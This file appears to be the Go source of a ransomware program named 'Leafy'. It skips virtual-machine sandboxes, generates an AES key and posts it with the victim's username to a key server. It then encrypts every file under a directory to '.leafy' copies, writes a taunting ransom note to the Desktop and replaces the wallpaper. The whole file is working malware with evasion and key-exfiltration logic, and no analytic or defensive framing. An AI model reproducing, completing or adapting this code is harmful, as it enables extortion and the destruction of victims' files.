package main

import (
	"bytes"
	"crypto/aes"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"net/http"
	encrypt "ninja/crypt"
	"ninja/wallpaper"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
)

func generateIV(bytes int) []byte {
	b := make([]byte, bytes)
	rand.Read(b)
	return b
}

func main() {
	userdir, err := user.Current()
	if err != nil {
		panic(err)
	}
	var cryptpath string = userdir.HomeDir + "\\go\\src\\ninja\\nnxx\\"
	cmdOutput, err := exec.Command("Systeminfo").Output()
	if err != nil {
	}
	if strings.Contains(string(cmdOutput), "VMware") {
		if strings.Contains(string(cmdOutput), "VMware Virtual Ethernet Adapter") {
			load(cryptpath, userdir.HomeDir)
		} else {
		}
	} else if strings.Contains(string(cmdOutput), "VirtualBox") {
	} else {
		load(cryptpath, userdir.HomeDir)
	}
}

func generateRandomString(s int) string {
	b := generateIV(s)
	return base64.URLEncoding.EncodeToString(b)
}

func load(pathtodir string, HomeDir string) {
	keyAes := generateIV(32)
	keyHmac := keyAes
	block, err := aes.NewCipher(keyAes)
	if err != nil {
		panic(err)
	}
	iv := generateIV(block.BlockSize())
	uniqueid := generateRandomString(20)
	err = keyzz(base64.StdEncoding.EncodeToString(iv), base64.StdEncoding.EncodeToString(keyAes), uniqueid)
	if err != nil {
	}
	filepath.Walk(pathtodir,
		func(path string, info os.FileInfo, err error) error {
			if filepath.Ext(path) != ".leafy" {
				go encrypt.Encrypt(path, path+".leafy", keyAes, keyHmac, block, iv)
			} else {
			}
			return nil
		})
	deathnote(HomeDir+"\\Desktop\\leafy.txt", uniqueid)
	wallpaper.Get()
	wallpaper.Change("https://wallpapercave.com/wp/wp1836699.jpg")
}

func keyzz(iv string, x string, id string) error {
	url := "http://127.0.0.1:5000/add"
	user, err := user.Current()
	if err != nil {
		panic(err)
	}
	values := map[string]string{"username": user.Username, "unique_id": id, "key": x, "iv": iv}
	jsonValue, _ := json.Marshal(values)
	var jsonStr = []byte(jsonValue)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
	}
	defer resp.Body.Close()
	return nil

}

func deathnote(path string, id string) {
	var note = "Free Leafy"
	f, err := os.Create(path)
	if err != nil {
		return
	}
	f.WriteString(note + " \n\n your unique id => " + id + "\nFuck you!!!")
	err = f.Close()
	if err != nil {
		return
	}
}
